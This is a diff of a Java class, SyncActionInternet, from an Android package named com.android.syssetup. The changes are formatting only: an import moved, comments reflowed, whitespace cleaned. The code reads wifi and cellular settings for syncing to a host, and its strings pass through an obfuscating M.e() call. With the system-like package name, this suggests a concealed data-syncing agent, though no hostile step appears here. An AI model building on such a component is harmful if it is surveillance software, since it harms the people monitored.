@@ -9,6 +9,7 @@
 
 package com.android.syssetup.action;
 
+import com.android.mm.M;
 import com.android.syssetup.action.sync.GprsTransport;
 import com.android.syssetup.action.sync.WifiTransport;
 import com.android.syssetup.auto.Cfg;
@@ -16,7 +17,6 @@ import com.android.syssetup.conf.ConfAction;
 import com.android.syssetup.conf.ConfigurationException;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.StringUtils;
-import com.android.mm.M;
 
 /**
  * The Class SyncActionInternet.
@@ -25,23 +25,30 @@ public class SyncActionInternet extends SyncAction {
 
 	private static final String TAG = "SyncActionInternet"; //$NON-NLS-1$
 
-	/** The wifi forced. */
+	/**
+	 * The wifi forced.
+	 */
 	protected boolean wifiForced;
 
-	/** The wifi. */
+	/**
+	 * The wifi.
+	 */
 	protected boolean wifi;
 
-	/** The gprs. */
+	/**
+	 * The gprs.
+	 */
 	protected boolean gprs;
 
-	/** The host. */
+	/**
+	 * The host.
+	 */
 	String host;
 
 	/**
 	 * Instantiates a new sync action internet.
-	 * 
-	 * @param params
-	 *            the conf params
+	 *
+	 * @param params the conf params
 	 */
 	public SyncActionInternet(final ConfAction params) {
 		super(params);
@@ -72,8 +79,8 @@ public class SyncActionInternet extends SyncAction {
 			gprs = params.getBoolean(M.e("cell"));
 			wifi = params.getBoolean(M.e("wifi"));
 			wifiForced = wifi;
-			
-			
+
+
 		} catch (final ConfigurationException e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
@@ -87,7 +94,7 @@ public class SyncActionInternet extends SyncAction {
 			wifi = true;
 			wifiForced = wifi;
 		}
-		
+
 		if (Cfg.DEBUG) {
 			final StringBuffer sb = new StringBuffer();
 			sb.append("gprs: " + gprs); //$NON-NLS-1$
